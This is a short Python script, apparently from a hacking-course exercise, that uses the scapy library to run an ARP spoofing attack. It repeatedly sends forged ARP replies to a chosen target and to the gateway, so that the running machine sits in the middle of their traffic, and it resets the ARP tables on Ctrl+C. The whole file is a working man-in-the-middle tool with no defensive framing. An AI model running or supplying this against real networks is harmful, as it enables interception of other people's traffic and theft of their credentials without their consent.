#!/usr/bin/env python
import sys
import time

import scapy.all as scapy
import optparse
import time
import sys


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target_ip", help="The target IP")
    parser.add_option("-s", "--source", dest="source_ip", help="The source IP")
    (options, arguments) = parser.parse_args()
    if not options.target_ip:
        parser.error("[-]Please enter the Target IP")
    elif not options.source_ip:
        parser.error("[-]Please enter the source IP")
    else:
        return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)  #Creating an arp packet
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


options = get_arguments()
target_ip = options.target_ip
gateway_ip = options.source_ip
try:
    sent_packet_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packet_count = sent_packet_count + 2
        print("\r[+]Packet sent: " + str(sent_packet_count)),  # For Python3 use print("\r[+]Packet sent: " + str(sent_packet_count), end = "")
        sys.stdout.flush()  # For python3 this isn't required
        time.sleep(2)
except KeyboardInterrupt:
    print("[+]Detected CTRL+C.....Resetting ARP tables.....Please wait\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
